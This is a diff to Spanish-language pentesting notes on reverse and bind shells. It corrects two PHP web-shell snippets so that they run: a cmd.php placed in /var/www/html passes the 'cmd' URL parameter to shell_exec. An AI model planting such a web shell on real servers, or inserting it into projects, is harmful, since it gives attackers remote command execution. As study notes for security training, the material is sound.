@@ -8,7 +8,7 @@ Tenemos diferntes tipos de [1 ReverShell](1%20ReverShell.md) en este pagina Web:
 Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
 ```shell
 ❯ nano cmd.php
-	❮?php 
+	<?php 
 		echo "<prep>" . shell_exec($_GET['cmd']) . "</prep>";
 	?>
 
@@ -42,7 +42,7 @@ Para ejecutar Netcat y hacer la **BindShell**:
 Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
 ```shell
 ❯ nano cmd.php
-	❮?php 
+	<?php 
 		echo shell_exec($_GET['cmd']);
 	?>
 
